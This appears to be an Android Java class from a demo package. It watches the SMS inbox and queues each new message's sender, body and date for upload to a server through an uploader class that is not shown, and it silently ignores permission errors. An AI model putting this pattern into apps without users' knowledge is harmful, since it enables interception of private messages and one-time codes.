package com.example.smsdemo;

import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.provider.Telephony;

import java.util.HashSet;
import java.util.Set;

public class SmsContentObserver extends ContentObserver {

    private final android.content.ContentResolver resolver;
    private final android.content.Context ctx;
    private final Set<Integer> recentIds = new HashSet<>();

    public SmsContentObserver(android.content.ContentResolver resolver, android.content.Context ctx) {
        super(new Handler(Looper.getMainLooper()));
        this.resolver = resolver;
        this.ctx = ctx;
    }

    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        Uri uri = Uri.parse("content://sms/inbox");
        try {
            Cursor cursor = resolver.query(uri, new String[]{"_id","address","body","type","date"}, null, null, "date DESC");
            if (cursor != null) {
                try {
                    if (cursor.moveToFirst()) {
                        int _id = cursor.getInt(0);
                        String address = cursor.getString(1);
                        String body = cursor.getString(2);
                        int type = cursor.getInt(3);
                        long date = cursor.getLong(4);
                        if (type == Telephony.Sms.MESSAGE_TYPE_INBOX) {
                            if (!recentIds.contains(_id) && _id > ConfigManager.getLastUploadedId(ctx)) {
                                recentIds.add(_id);
                                HttpUploader.enqueueUpload(ctx, _id, address, body, type, date);
                            }
                        }
                    }
                } finally {
                    cursor.close();
                }
            }
        } catch (SecurityException ignored) {
        } catch (IllegalArgumentException ignored) {
        }
    }
}
